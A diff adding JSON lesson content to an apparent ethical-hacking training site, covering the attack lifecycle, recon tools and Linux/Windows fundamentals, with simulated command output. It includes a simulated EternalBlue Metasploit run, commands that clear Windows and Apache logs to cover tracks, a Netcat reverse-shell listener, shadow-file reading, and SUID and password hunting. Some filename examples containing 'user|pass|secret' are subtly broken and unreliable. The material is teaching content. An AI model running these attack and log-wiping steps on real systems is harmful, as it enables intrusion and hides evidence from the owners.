@@ -1,5 +1,438 @@
 [
   {
+    "id": "ethical-hacking",
+    "title": "Ethical Hacking",
+    "difficulty": "Beginner",
+    "description": "Foundational methodology and theoretical framework of ethical hacking, covering the five stages of the attack lifecycle.",
+    "concept": "Ethical hacking follows a structured five-stage process: Reconnaissance, Scanning, Gaining Access, Maintaining Access, and Covering Tracks. This methodology ensures thorough vulnerability assessment and responsible disclosure.",
+    "tools": [
+      {
+        "name": "01 Overview: Hacking Lifecycle",
+        "description": "The five stages of a professional penetration test.",
+        "commands": [
+          {
+            "command": "1. Reconnaissance",
+            "description": "Gathering information about the target. Passive techniques like OSINT, DNS records, and website browsing.",
+            "isReadOnly": true
+          },
+          {
+            "command": "2. Scanning",
+            "description": "Actively probing the network to discover open ports, services, and vulnerabilities.",
+            "isReadOnly": true
+          },
+          {
+            "command": "3. Gaining Access",
+            "description": "Exploiting vulnerabilities (password cracking, social engineering, software flaws) to enter the system.",
+            "isReadOnly": true
+          },
+          {
+            "command": "4. Maintaining Access",
+            "description": "Establishing persistence via backdoors or remote access tools to assess long-term impact.",
+            "isReadOnly": true
+          },
+          {
+            "command": "5. Covering Tracks",
+            "description": "Removing logs and traces of activity to remain undetected and restore system state.",
+            "isReadOnly": true
+          }
+        ]
+      },
+      {
+        "name": "02 Phase 1: Reconnaissance Tools",
+        "description": "Tools for passive and active discovery.",
+        "commands": [
+          {
+            "command": "theHarvester -d example.com -b google",
+            "description": "Gather emails and subdomains from public sources.",
+            "simulation": "[*] Searching Google...\n[*] Found 15 subdomains\n[*] Found 8 email addresses\nadmin@example.com\nsupport@example.com"
+          },
+          {
+            "command": "Recon-ng",
+            "description": "A full-featured Web Reconnaissance framework.",
+            "simulation": "[recon-ng][default] > modules load recon/domains-hosts/bing_domain_web\n[recon-ng][default][bing_domain_web] > run\n[*] Country: USA\n[*] IP: 93.184.216.34"
+          },
+          {
+            "command": "Maltego",
+            "description": "OSINT and relationship mapping tool (Analysis Tool)",
+            "isReadOnly": true
+          }
+        ]
+      },
+      {
+        "name": "03 Phase 2: Scanning & Discovery",
+        "description": "Tools used to discover services and weaknesses.",
+        "commands": [
+          {
+            "command": "nessus",
+            "description": "Enterprise-grade vulnerability scanner.",
+            "isReadOnly": true
+          },
+          {
+            "command": "openvas-start",
+            "description": "Open-source vulnerability scanner setup.",
+            "simulation": "Starting OpenVAS services...\nNVT Cache updated.\nWeb Interface available at https://localhost:9392"
+          }
+        ]
+      },
+      {
+        "name": "04 Phase 3-5: Access & Persistence",
+        "description": "Tools for exploitation, maintenance, and track covering.",
+        "commands": [
+          {
+            "command": "msfconsole",
+            "description": "Metasploit Framework: The most widely used exploitation tool.",
+            "simulation": "msf6 > search cve:2021-1234\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.10.10.15\nmsf6 exploit(ms17_010_eternalblue) > run\n[*] Meterpreter session 1 opened!"
+          },
+          {
+            "command": "wevtutil cl System",
+            "description": "Clear Windows System event logs (Covering Tracks).",
+            "simulation": "[*] Executing: wevtutil cl System\n[*] Result: Log 'System' has been cleared successfully."
+          },
+          {
+            "command": "rm -rf /var/log/apache2/*.log",
+            "description": "Remove Linux service logs (Covering Tracks).",
+            "simulation": "[*] Deleting Apache access and error logs...\n[*] Done."
+          }
+        ]
+      },
+      {
+        "name": "05 Web Recon: Validation & DNS",
+        "description": "Confirming target legitimacy and infrastructure.",
+        "commands": [
+          {
+            "command": "whois example.com",
+            "description": "Domain ownership and registrar details.",
+            "simulation": "Domain Name: EXAMPLE.COM\nRegistrar: SafeNames Ltd\nUpdated Date: 2023-08-14\nCreation Date: 1995-08-14\nName Server: NS1.RESERVED-INTERNET.COM"
+          },
+          {
+            "command": "nslookup example.com",
+            "description": "Standard DNS query tool.",
+            "simulation": "Server: 127.0.0.53\nAddress: 127.0.0.53#53\nNon-authoritative answer:\nName: example.com\nAddress: 93.184.216.34"
+          },
+          {
+            "command": "dnsrecon -d example.com",
+            "description": "Advanced DNS enumeration.",
+            "simulation": "[*] Performing General Enumeration...\n[*] A example.com 93.184.216.34\n[*] NS example.com ns1.reserved-internet.com\n[*] MX example.com mail.example.com"
+          }
+        ]
+      },
+      {
+        "name": "06 Web Recon: Subdomain Discovery",
+        "description": "Expanding the attack surface.",
+        "commands": [
+          {
+            "command": "sublist3r -d example.com",
+            "description": "Aggregating subdomains from multiple sources.",
+            "simulation": "[-] Enumerating subdomains now for example.com\n[-] Found 4 subdomains\ndev.example.com\nmail.example.com\nadmin.example.com\napi.example.com"
+          },
+          {
+            "command": "google-dorking: site:example.com",
+            "description": "Using search operators to find hidden resources.",
+            "isReadOnly": true
+          }
+        ]
+      },
+      {
+        "name": "07 Web Recon: Fingerprinting",
+        "description": "Identifying the technology stack.",
+        "commands": [
+          {
+            "command": "whatweb example.com",
+            "description": "Identifies CMS, frameworks, and servers.",
+            "simulation": "http://example.com [200 OK] Apache[2.4.41], HTTPServer[Ubuntu Linux], WordPress[5.8]"
+          },
+          {
+            "command": "wappalyzer-extension",
+            "description": "Browser-based technology profiler.",
+            "isReadOnly": true
+          }
+        ]
+      },
+      {
+        "name": "08 Ethics & Professionalism",
+        "description": "Legal and ethical guidelines for penetration testing.",
+        "commands": [
+          {
+            "command": "Authorization Rule",
+            "description": "Always obtain written permission before conducting any testing.",
+            "isReadOnly": true
+          },
+          {
+            "command": "Confidentiality",
+            "description": "Protect target data and report findings only to authorized personnel.",
+            "isReadOnly": true
+          },
+          {
+            "command": "Law Compliance",
+            "description": "Operate within local and international cyber laws.",
+            "isReadOnly": true
+          }
+        ]
+      }
+    ],
+    "attackChain": [
+      { "step": "Validation", "desc": "Confirm target legitimacy" },
+      { "step": "Discovery", "desc": "Expand attack surface" },
+      { "step": "Fingerprinting", "desc": "Identify technologies" },
+      { "step": "Breach", "desc": "Detect leaked data" }
+    ],
+    "challenges": [],
+    "resources": [
+      { "title": "OWASP Testing Guide", "url": "https://owasp.org/www-project-web-security-testing-guide/" },
+      { "title": "Have I Been Pwned", "url": "https://haveibeenpwned.com" }
+    ]
+  },
+  {
+    "id": "fundamental-of-hacking",
+    "title": "Fundamental Of Hacking",
+    "difficulty": "Beginner",
+    "description": "Master Linux & Windows internals, exploration tools, and detection techniques — the essential foundation for every ethical hacker.",
+    "concept": "Before exploiting any system, you must understand how it works. This module covers the full spectrum: Linux CLI mastery, filesystem navigation, user/permission management, network analysis, service exploration tools like Nmap and Gobuster, and defensive detection with IDS and log analysis. Both attacker and defender perspectives are covered.",
+    "tools": [
+      {
+        "name": "01 Linux: Shell & Terminal",
+        "description": "The shell is the interface between you and the operating system kernel. Understanding it is the first step to mastering Linux.",
+        "commands": [
+          { "command": "What is a Shell?", "description": "Computer hardware (CPU, RAM, Disk) is useless on its own — the Kernel manages them but only understands binary. The Shell translates your human-readable commands (e.g., 'ls') into machine language the kernel can execute. It then takes the kernel's response and displays it back in a readable format. Think of it as a translator between you and the machine.", "isReadOnly": true },
+          { "command": "CLI vs GUI", "description": "CLI (Command Line Interface) uses a Terminal window where you type commands — powerful and scriptable. GUI (Graphical User Interface) uses windows, icons, and mouse clicks — user-friendly but less flexible for hacking tasks.", "isReadOnly": true },
+          { "command": "echo $SHELL", "description": "Prints the path of your current shell interpreter. This tells you which shell program processes your commands.", "simulation": "/bin/bash" },
+          { "command": "cat /etc/shells", "description": "Lists all available shells installed on the system. Useful to check what shells you can switch to.", "simulation": "/bin/sh\n/bin/bash\n/usr/bin/zsh\n/usr/bin/fish\n/bin/dash" },
+          { "command": "Common Shells", "description": "Bash (Bourne Again Shell): Default on most Linux distros, supports scripting. Zsh: Enhanced Bash with autocomplete, themes, and plugins (oh-my-zsh). Fish: User-friendly with syntax highlighting out of the box. Dash: Lightweight, used for system scripts.", "isReadOnly": true },
+          { "command": "chsh -s /usr/bin/zsh", "description": "Change your default shell to Zsh. Requires re-login to take effect.", "simulation": "Shell changed." }
+        ]
+      },
+      {
+        "name": "01b Linux: Terminal Shortcuts",
+        "description": "Professional hackers rarely use the mouse. These keyboard shortcuts dramatically increase your speed in the terminal.",
+        "commands": [
+          { "command": "Ctrl + C", "description": "SIGINT — Interrupt and immediately stop the currently running process. Essential when a scan or command hangs.", "isReadOnly": true },
+          { "command": "Ctrl + Z", "description": "SIGTSTP — Suspend (pause) the current foreground process and return to the shell. Use 'bg' to continue it in background or 'fg' to resume.", "isReadOnly": true },
+          { "command": "Ctrl + D", "description": "Send EOF (End Of File). Exits the current shell session or closes input for commands like 'cat'.", "isReadOnly": true },
+          { "command": "Ctrl + L", "description": "Clear the terminal screen instantly (equivalent to typing 'clear'). The scrollback buffer is preserved.", "isReadOnly": true },
+          { "command": "Ctrl + A / Ctrl + E", "description": "Jump cursor to the beginning (A) or end (E) of the current line. Saves time when editing long commands.", "isReadOnly": true },
+          { "command": "Ctrl + R", "description": "Reverse-search through your command history. Start typing any part of a previous command to find it instantly.", "isReadOnly": true },
+          { "command": "Tab (Autocomplete)", "description": "Press Tab once to auto-complete file/command names. Press Tab twice to see all possible completions.", "isReadOnly": true },
+          { "command": "!!", "description": "Repeat the last command. Common pattern: 'sudo !!' to re-run the last command with root privileges.", "simulation": "minal@ligerverse-os:~$ apt update\nE: Could not open lock file - Permission denied\nminal@ligerverse-os:~$ sudo !!\nsudo apt update\nHit:1 http://archive.ubuntu.com/ubuntu jammy InRelease\nReading package lists... Done" },
+          { "command": "history | grep nmap", "description": "Search your command history for a specific tool. Shows line numbers you can re-execute with '!<number>'.", "simulation": "  142  nmap -sV 10.10.10.5\n  156  nmap -sC -sV -oN scan.txt 10.10.10.5\n  189  nmap -p- 10.10.10.5" }
+        ]
+      },
+      {
+        "name": "02 Linux: Navigation & Paths",
+        "description": "Linux organizes everything in a tree structure starting from / (root). Navigating efficiently is critical during penetration tests.",
+        "commands": [
+          { "command": "pwd", "description": "Print Working Directory — shows the absolute path of your current location. Always know where you are before running commands.", "simulation": "/home/minal/Documents" },
+          { "command": "ls -la", "description": "List ALL files including hidden ones (starting with .) in long format showing permissions, owner, size, and timestamps.", "simulation": "total 32\ndrwxr-xr-x  4 minal minal 4096 May  4 20:00 .\ndrwxr-xr-x 18 minal minal 4096 May  4 19:00 ..\n-rw-------  1 minal minal  220 Apr 29 08:00 .bash_history\n-rw-r--r--  1 minal minal 3771 Apr 29 08:00 .bashrc\ndrwxr-xr-x  2 minal minal 4096 May  4 20:00 Documents\n-rw-r--r--  1 minal minal  807 Apr 29 08:00 .profile" },
+          { "command": "cd /var/log", "description": "Change Directory using an absolute path (starts from root /). Takes you directly to the system log directory.", "simulation": "minal@ligerverse-os:/var/log$" },
+          { "command": "cd ..", "description": "Move one level up to the parent directory. Two dots (..) always reference the parent, one dot (.) references the current directory.", "simulation": "minal@ligerverse-os:/var$" },
+          { "command": "cd ~", "description": "Jump directly to your home directory from anywhere. The tilde (~) is a shortcut for /home/username.", "simulation": "minal@ligerverse-os:~$" },
+          { "command": "cd -", "description": "Toggle back to the previous directory you were in. Useful for switching between two locations.", "simulation": "/var/log" },
+          { "command": "Absolute vs Relative", "description": "Absolute paths start from root / (e.g., /etc/passwd). Relative paths start from your current location (e.g., ./scripts/exploit.sh or ../config). Use absolute paths in scripts for reliability.", "isReadOnly": true }
+        ]
+      },
+      {
+        "name": "02b Linux: Filesystem Hierarchy",
+        "description": "Every Linux system follows the Filesystem Hierarchy Standard (FHS). Knowing what lives where is essential for both attacking and defending.",
+        "commands": [
+          { "command": "/bin & /sbin", "description": "Essential binaries: /bin contains user commands (ls, cp, cat, grep). /sbin contains system/admin commands (fdisk, reboot, iptables). These are available even in single-user recovery mode.", "isReadOnly": true },
+          { "command": "/etc", "description": "System-wide configuration files — the goldmine for attackers. Contains /etc/passwd (user accounts), /etc/shadow (password hashes), /etc/hosts (DNS overrides), /etc/crontab (scheduled tasks), /etc/ssh/sshd_config (SSH settings).", "isReadOnly": true },
+          { "command": "/var", "description": "Variable data that changes during operation. /var/log contains ALL system logs (auth.log, syslog, apache2/). /var/www is the default web root for Apache. /var/mail stores user mailboxes.", "isReadOnly": true },
+          { "command": "/tmp & /dev/shm", "description": "World-writable temporary directories. Hackers use these for staging exploits because any user can write here. /tmp is on disk, /dev/shm is in RAM (faster, no disk trace). Both are cleared on reboot.", "isReadOnly": true },
+          { "command": "/home & /root", "description": "/home/<username> is the personal directory for regular users. /root is the superuser's home (not inside /home). User configs like .bashrc, .ssh/authorized_keys, and .bash_history live here.", "isReadOnly": true },
+          { "command": "/opt & /usr/local", "description": "Third-party and manually installed software. /opt is for self-contained packages. /usr/local/bin is for user-compiled binaries. Check these for custom or vulnerable applications.", "isReadOnly": true },
+          { "command": "/proc & /sys", "description": "Virtual filesystems exposing kernel and process info. /proc/version shows kernel version. /proc/<PID>/cmdline reveals running process commands. Invaluable for enumeration.", "isReadOnly": true }
+        ]
+      },
+      {
+        "name": "03 Linux: File & Directory Ops",
+        "description": "Creating, copying, moving, and deleting files and directories. These are the building blocks of every operation in the terminal.",
+        "commands": [
+          { "command": "touch user|pass|secret.txt", "description": "Create an empty file or update the timestamp of an existing one. Useful for creating placeholder files or modifying file metadata.", "simulation": "minal@ligerverse-os:~$ touch user|pass|secret.txt\nminal@ligerverse-os:~$ ls -la user|pass|secret.txt\n-rw-rw-r-- 1 minal minal 0 May  4 20:15 user|pass|secret.txt" },
+          { "command": "mkdir -p labs/exploits/windows", "description": "Create nested directories in one command. The -p flag creates parent directories as needed without errors.", "simulation": "minal@ligerverse-os:~$ tree labs\nlabs\n└── exploits\n    └── windows\n\n2 directories, 0 files" },
+          { "command": "cp -r /var/www/html /tmp/backup", "description": "Copy files or directories recursively. The -r flag is required for directories. Always backup before modifying.", "simulation": "minal@ligerverse-os:~$ ls /tmp/backup/\nindex.html  config.php  uploads/" },
+          { "command": "mv old.txt new.txt", "description": "Move or rename files/directories. Also used for renaming. Unlike cp, the original is removed.", "simulation": "minal@ligerverse-os:~$ mv old.txt new.txt\nminal@ligerverse-os:~$ ls\nnew.txt" },
+          { "command": "rm -rf folder", "description": "Remove files/directories forcefully and recursively. WARNING: No confirmation, no trash can — data is gone permanently. Use with extreme caution.", "simulation": "minal@ligerverse-os:~$ rm -rf folder\nminal@ligerverse-os:~$ ls folder\nls: cannot access 'folder': No such file or directory" },
+          { "command": "ln -s /path/to/target link_name", "description": "Create a symbolic link (shortcut). Symlinks point to another file/directory. Used in attacks to redirect file access.", "simulation": "minal@ligerverse-os:~$ ln -s /etc/passwd my_link\nminal@ligerverse-os:~$ cat my_link\nroot:x:0:0:root:/root:/bin/bash" }
+        ]
+      },
+      {
+        "name": "04 Linux: Searching & Filtering",
+        "description": "Finding files, searching text, and processing data are core skills. During a pentest, you need to quickly locate config files, passwords, and sensitive data.",
+        "commands": [
+          { "command": "find / -name \"*.conf\" 2>/dev/null", "description": "Search the entire filesystem for files matching a pattern. The 2>/dev/null suppresses 'Permission denied' errors so you only see results.", "simulation": "/etc/nmap.conf\n/etc/apache2/apache2.conf\n/etc/ssh/sshd_config\n/etc/mysql/my.cnf" },
+          { "command": "find / -type f -writable 2>/dev/null", "description": "Find all writable files on the system. Critical for privilege escalation — writable scripts run by root can be hijacked.", "simulation": "/tmp/cleanup.sh\n/var/www/html/config.php\n/opt/scripts/backup.sh" },
+          { "command": "grep -r \"password\" /var/www", "description": "Recursively search for the string 'password' in all web files. The -r flag searches subdirectories. Use -i for case-insensitive search.", "simulation": "/var/www/config.php: $db_pass = 'P@ssw0rd123';\n/var/www/html/login.php: // TODO: remove hardcoded password" },
+          { "command": "grep -rnE 'user|pass|secret' /etc/ 2>/dev/null", "description": "Search for multiple patterns simultaneously using the OR operator. The -n flag shows line numbers for each match.", "simulation": "/etc/passwd:1:root:x:0:0:root:/root:/bin/bash\n/etc/mysql/my.cnf:24:user=root\n/etc/mysql/my.cnf:25:password=toor123" },
+          { "command": "locate shadow", "description": "Fast file search using a pre-built database (updated by 'updatedb'). Much faster than 'find' but may not include recent files.", "simulation": "/etc/shadow\n/etc/shadow-\n/usr/share/man/man5/shadow.5.gz" },
+          { "command": "which python3", "description": "Shows the full path of a command's executable. Useful to verify if a tool is installed and where it lives.", "simulation": "/usr/bin/python3" },
+          { "command": "wc -l /etc/passwd", "description": "Count the number of lines in a file. Quick way to see how many user accounts exist on the system.", "simulation": "42 /etc/passwd" }
+        ]
+      },
+      {
+        "name": "04b Linux: Advanced Redirection",
+        "description": "Linux uses three data streams: STDIN (0, input), STDOUT (1, normal output), and STDERR (2, error output). Mastering redirection lets you control where data flows.",
+        "commands": [
+          { "command": "command > file.txt", "description": "Redirect STDOUT to a file, overwriting existing content. The > operator creates the file if it doesn't exist. Use for saving scan results.", "simulation": "minal@ligerverse-os:~$ echo \"hello\" > test.txt\nminal@ligerverse-os:~$ cat test.txt\nhello" },
+          { "command": "command >> file.txt", "description": "Append STDOUT to a file without overwriting. Use >> when you want to accumulate results from multiple commands.", "simulation": "minal@ligerverse-os:~$ echo \"world\" >> test.txt\nminal@ligerverse-os:~$ cat test.txt\nhello\nworld" },
+          { "command": "command 2> errors.log", "description": "Redirect only STDERR (stream 2) to a file. Useful for capturing error messages separately while keeping normal output on screen.", "simulation": "minal@ligerverse-os:~$ find / -name user|pass|secret 2> errors.log\n/tmp/user|pass|secret\nminal@ligerverse-os:~$ cat errors.log\nfind: '/root': Permission denied\nfind: '/proc/1': Permission denied" },
+          { "command": "command 2>&1", "description": "Merge STDERR into STDOUT so both go to the same destination. Essential for piping all output: 'nmap 10.10.10.5 2>&1 | tee scan.log'", "isReadOnly": true },
+          { "command": "command | tee output.txt", "description": "Pipe output to both screen AND file simultaneously. Perfect for monitoring scans in real-time while saving results.", "simulation": "minal@ligerverse-os:~$ nmap 10.10.10.5 | tee scan.txt\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http" },
+          { "command": "Pipe Operator |", "description": "The pipe | sends STDOUT of one command as STDIN to the next. Chain commands together: 'cat /etc/passwd | grep bash | cut -d: -f1' extracts all users with bash shell.", "isReadOnly": true }
+        ]
+      },
+      {
+        "name": "05 Linux: User & Group Mgmt",
+        "description": "Managing identities and privileges.",
+        "commands": [
+          { "command": "cat /etc/passwd", "description": "List all system users. Format: username:password:UID:GID:info:home:shell.", "simulation": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nminal:x:1000:1000:minal:/home/minal:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" },
+          { "command": "cat /etc/shadow", "description": "Password hashes (root only). Critical target for attackers.", "simulation": "root:$6$rAnD0m$hAsH3dP4ssW0rd...:19000:0:99999:7:::\nminal:$6$s4Lt$3nCrYpT3dH4sH...:19100:0:99999:7:::" },
+          { "command": "sudo -l", "description": "List allowed sudo commands — key for privilege escalation.", "simulation": "User minal may run the following commands on ligerverse-os:\n    (ALL : ALL) ALL\n    (root) NOPASSWD: /usr/bin/vim" },
+          { "command": "useradd -m -s /bin/bash newuser", "description": "Create a new user with home directory and bash shell.", "simulation": "root@ligerverse-os:~# useradd -m -s /bin/bash newuser\nroot@ligerverse-os:~# id newuser\nuid=1001(newuser) gid=1001(newuser) groups=1001(newuser)" },
+          { "command": "chown root:root file.txt", "description": "Change file owner and group to root.", "simulation": "minal@ligerverse-os:~$ ls -l file.txt\n-rw-r--r-- 1 root root 0 Apr 29 23:50 file.txt" }
+        ]
+      },
+      {
+        "name": "06 Linux: Permissions & Octal",
+        "description": "Understanding rwx and access control.",
+        "commands": [
+          { "command": "chmod 755 script.sh", "description": "Set permissions: Owner (7=rwx), Group (5=r-x), Others (5=r-x).", "simulation": "minal@ligerverse-os:~$ chmod 755 script.sh\nminal@ligerverse-os:~$ ls -la script.sh\n-rwxr-xr-x 1 minal minal 42 May 04 20:00 script.sh" },
+          { "command": "chmod +x binary", "description": "Make a file executable.", "simulation": "minal@ligerverse-os:~$ chmod +x binary\nminal@ligerverse-os:~$ ls -l binary\n-rwxrwxr-x 1 minal minal 1024 binary" },
+          { "command": "find / -perm -4000 2>/dev/null", "description": "Find all SUID binaries — critical for privilege escalation.", "simulation": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/pkexec\n/usr/bin/newgrp\n/usr/local/bin/vulnerable_app" },
+          { "command": "Octal Reference", "description": "0=---, 1=--x, 2=-w-, 3=-wx, 4=r--, 5=r-x, 6=rw-, 7=rwx. Special: SUID=4000, SGID=2000, Sticky=1000.", "isReadOnly": true }
+        ]
+      },
+      {
+        "name": "07 Linux: Network Management",
+        "description": "Analyzing network connections and interfaces.",
+        "commands": [
+          { "command": "ip a", "description": "Show all network interfaces and IP addresses.", "simulation": "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 10.35.62.230/24 brd 10.35.62.255 scope global eth0" },
+          { "command": "ss -tunlp", "description": "Show all listening TCP/UDP ports and associated processes.", "simulation": "Netid  State   Recv-Q  Send-Q  Local Address:Port   Peer Address:Port  Process\ntcp    LISTEN  0       128     0.0.0.0:22            0.0.0.0:*          sshd\ntcp    LISTEN  0       511     0.0.0.0:80            0.0.0.0:*          apache2\ntcp    LISTEN  0       128     127.0.0.1:3306        0.0.0.0:*          mysqld" },
+          { "command": "nc -lvp 4444", "description": "Start a Netcat listener on port 4444 (reverse shell catcher).", "simulation": "listening on [any] 4444 ...\nconnect to [10.35.62.230] from target [10.10.10.5] 39210\nid\nuid=33(www-data) gid=33(www-data)" },
+          { "command": "ping -c 3 10.10.10.5", "description": "Test network connectivity to a target.", "simulation": "PING 10.10.10.5 (10.10.10.5) 56(84) bytes of data.\n64 bytes from 10.10.10.5: icmp_seq=1 ttl=64 time=0.523 ms\n64 bytes from 10.10.10.5: icmp_seq=2 ttl=64 time=0.412 ms\n--- 10.10.10.5 ping statistics ---\n3 packets transmitted, 3 received, 0% packet loss" },
+          { "command": "traceroute 10.10.10.5", "description": "Trace the network path to a target.", "simulation": "traceroute to 10.10.10.5, 30 hops max\n 1  gateway (10.35.62.1)  1.234 ms\n 2  10.0.0.1  5.678 ms\n 3  10.10.10.5  12.345 ms" }
+        ]
+      },
+      {
+        "name": "07b Linux: Process Control",
+        "description": "Understanding processes is vital. Every running program is a process with a PID. During pentests, you need to manage long-running scans, background tasks, and monitor system activity.",
+        "commands": [
+          { "command": "ps aux", "description": "Show ALL running processes for ALL users with detailed info (USER, PID, CPU%, MEM%, COMMAND). The go-to command for process enumeration.", "simulation": "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1 169356 11892 ?        Ss   08:00   0:01 /sbin/init\nroot       456  0.0  0.2  72300  6780 ?        Ss   08:00   0:00 /usr/sbin/sshd\nwww-data   789  0.1  0.5 256784 23456 ?        S    08:01   0:03 /usr/sbin/apache2\nminal     1234  0.0  0.0   8132  3456 pts/0    Ss   20:10   0:00 -bash" },
+          { "command": "top -u www-data", "description": "Real-time process monitor filtered by user. Shows CPU/memory usage live. Press 'q' to quit. Alternative: 'htop' for a more visual interface.", "simulation": "top - 20:30:01 up  12:30,  1 user,  load average: 0.15, 0.10, 0.05\n  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+\n  789 www-data  20   0  256784  23456  11234 S   0.3   0.5   0:03.45 apache2" },
+          { "command": "command &", "description": "Append & to run any command in the background. Your terminal stays free for other work. The shell prints the job number and PID.", "simulation": "minal@ligerverse-os:~$ nmap -p- 10.10.10.5 &\n[1] 12345" },
+          { "command": "jobs", "description": "List all background jobs for the current shell session with their status (Running, Stopped, Done).", "simulation": "[1]+  Running                 nmap -p- 10.10.10.5 &" },
+          { "command": "fg %1", "description": "Bring background job #1 to the foreground. Use with Ctrl+Z to pause and resume tasks.", "simulation": "minal@ligerverse-os:~$ fg %1\nnmap -p- 10.10.10.5" },
+          { "command": "kill -9 12345", "description": "Send SIGKILL to forcefully terminate a process by PID. Use -15 (SIGTERM) first for graceful shutdown, -9 only as last resort.", "simulation": "[1]+  Killed                  nmap -p- 10.10.10.5" },
+          { "command": "pgrep -la apache", "description": "Search for processes by name. Shows PID and full command line. Faster than 'ps aux | grep'.", "simulation": "789 /usr/sbin/apache2 -k start\n790 /usr/sbin/apache2 -k start\n791 /usr/sbin/apache2 -k start" }
+        ]
+      },
+      {
+        "name": "08 Windows: Architecture & Files",
+        "description": "Windows has a fundamentally different architecture from Linux. Understanding its filesystem, registry, and internals is essential for attacking and defending Windows targets.",
+        "commands": [
+          { "command": "NTFS vs FAT32", "description": "NTFS (New Technology File System): Modern Windows default. Supports files >4GB, file-level security permissions (ACLs), journalling for crash recovery, and encryption (EFS). FAT32: Legacy format, no security features, 4GB file size limit. Still used on USB drives and older systems.", "isReadOnly": true },
+          { "command": "Alternate Data Streams (ADS)", "description": "An NTFS feature that lets you hide data inside a file without changing its visible size. Example: 'notepad file.txt:hidden.txt' creates a hidden stream. Malware uses ADS to hide payloads. Detect with: 'dir /r' or 'streams.exe' from Sysinternals.", "isReadOnly": true },
+          { "command": "Windows Registry", "description": "A hierarchical database storing all OS and application settings. Key hives: HKLM (machine-wide), HKCU (current user), HKCR (file associations). Attackers use it for persistence (Run keys), credential extraction, and disabling security.", "isReadOnly": true },
+          { "command": "System Directories", "description": "C:\\Windows\\System32: Core OS binaries and DLLs. C:\\Users\\<name>: User profiles with Desktop, Documents, AppData. C:\\Program Files: 64-bit software. C:\\Program Files (x86): 32-bit software. C:\\Windows\\Temp: System temp files.", "isReadOnly": true },
+          { "command": "Critical System Files", "description": "SAM (Security Account Manager): Stores local password hashes at C:\\Windows\\System32\\config\\SAM. SYSTEM: Contains the boot key to decrypt SAM. NTDS.dit: Active Directory database on Domain Controllers.", "isReadOnly": true }
+        ]
+      },
+      {
+        "name": "09 Windows: Security Measures",
+        "description": "Windows implements multiple security layers. Understanding these helps both in bypassing them (offensive) and hardening them (defensive).",
+        "commands": [
+          { "command": "UAC (User Account Control)", "description": "Prompts for consent/credentials before elevated operations. Levels range from 'Never notify' to 'Always notify'. Bypass techniques exist (fodhelper, eventvwr) but are regularly patched. Check level: msconfig > Tools > UAC.", "isReadOnly": true },
+          { "command": "Windows Defender / AMSI", "description": "Real-time antivirus with cloud-based detection. AMSI (Antimalware Scan Interface) inspects PowerShell scripts before execution. Attackers use obfuscation, AMSI bypasses, and in-memory execution to evade.", "isReadOnly": true },
+          { "command": "BitLocker", "description": "Full-volume encryption using AES-128 or AES-256. Protects data on lost/stolen devices. Recovery key is required if TPM fails. Can be managed via 'manage-bde' command or Group Policy.", "isReadOnly": true },
+          { "command": "Windows Firewall", "description": "Built-in stateful firewall with inbound/outbound rules per profile (Domain, Private, Public). Managed via 'netsh advfirewall' (CMD) or 'Get-NetFirewallRule' (PowerShell). Often misconfigured on internal networks.", "isReadOnly": true },
+          { "command": "AppLocker / WDAC", "description": "Application whitelisting policies that restrict which executables, scripts, and DLLs can run. WDAC (Windows Defender Application Control) is the modern replacement. Bypass: DLL side-loading, LOLBins.", "isReadOnly": true }
+        ]
+      },
+      {
+        "name": "10 Windows: CLI & PowerShell",
+        "description": "Windows provides two command-line environments: CMD (legacy) and PowerShell (modern, object-oriented). PowerShell is extremely powerful for both attackers and administrators.",
+        "commands": [
+          { "command": "dir /s /b *.txt", "description": "CMD: Recursively search for .txt files. /s=subdirectories, /b=bare format (paths only). Equivalent to 'find' in Linux.", "simulation": "C:\\Users\\Minal\\Desktop\\user|pass|secret.txt\nC:\\Users\\Minal\\Documents\\notes.txt\nC:\\Users\\Minal\\AppData\\Local\\Temp\\creds.txt" },
+          { "command": "Get-Process | Where-Object {$_.CPU -gt 10}", "description": "PowerShell: Filter processes by CPU usage. PowerShell uses objects (not text), so filtering is precise. Pipe to Select-Object for specific properties.", "simulation": "Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- ----------\n    543      45    67890     123456      15.5   1234   1 chrome\n    123      12    34567      56789      22.3   5678   1 MsMpEng" },
+          { "command": "ipconfig /all", "description": "CMD: Show complete network configuration including DHCP, DNS servers, MAC address, and gateway. Essential for network reconnaissance on Windows targets.", "simulation": "Windows IP Configuration\n   Host Name . . . . . . . . . . . . : LIGER-WIN10\n   Primary Dns Suffix . . . . . . .  : corp.local\n   DNS Servers . . . . . . . . . . . : 10.35.62.1\n   IPv4 Address. . . . . . . . . . . : 10.35.62.230\n   Subnet Mask . . . . . . . . . . . : 255.255.255.0\n   Default Gateway . . . . . . . . . : 10.35.62.1" },
+          { "command": "netstat -ano", "description": "CMD: Show all network connections with PIDs. The -o flag reveals which process owns each connection. Cross-reference with tasklist.", "simulation": "Proto  Local Address          Foreign Address        State           PID\nTCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\nTCP    10.35.62.230:445       192.168.1.50:49152     ESTABLISHED     4\nTCP    10.35.62.230:3389      192.168.1.100:51234    ESTABLISHED     1056" },
+          { "command": "Get-LocalUser | Select Name,Enabled", "description": "PowerShell: List all local user accounts and their status. Useful for identifying disabled/guest accounts that might be re-enabled.", "simulation": "Name          Enabled\n----          -------\nAdministrator   False\nGuest           False\nminal            True\nsvc_backup       True" },
+          { "command": "PowerShell Aliases", "description": "PowerShell aliases Linux commands: ls=Get-ChildItem, cat=Get-Content, pwd=Get-Location, cd=Set-Location, cp=Copy-Item, mv=Move-Item, rm=Remove-Item, ps=Get-Process.", "isReadOnly": true }
+        ]
+      },
+      {
+        "name": "11 Text Editors: Nano & Vim",
+        "description": "Editing files in the terminal.",
+        "commands": [
